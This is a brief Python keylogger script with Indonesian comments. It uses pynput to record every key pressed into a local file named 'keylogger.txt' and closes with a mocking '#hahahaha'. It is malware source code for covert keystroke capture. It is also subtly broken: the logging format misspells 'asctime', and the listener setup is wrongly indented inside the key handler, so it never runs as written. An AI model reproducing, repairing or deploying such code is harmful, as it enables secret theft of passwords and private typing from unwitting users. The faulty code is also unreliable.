#import modul pyinput untuk monitoring keyboard dan bikin lognyx

from pynput.keyboard import Key, Listener
import logging

#bikin variabel di mana log akan di simpan 

log_dir = ""

#kasih nama dan format ke logging modul

logging.basicConfig (filename= (log_dir + "keylogger.txt"), level=logging.DEBUG, format="%(ascitime)s:%(message)s")

#bikin definisi bahwa setiap keyboard di tekan akan tercatat di log file

def on_press(key) :
    logging.info(str(key))

#setup fungsi listener atau monitoring

    with Listener(on_press=on_press) as listener:
        listener.join()

#hahahaha
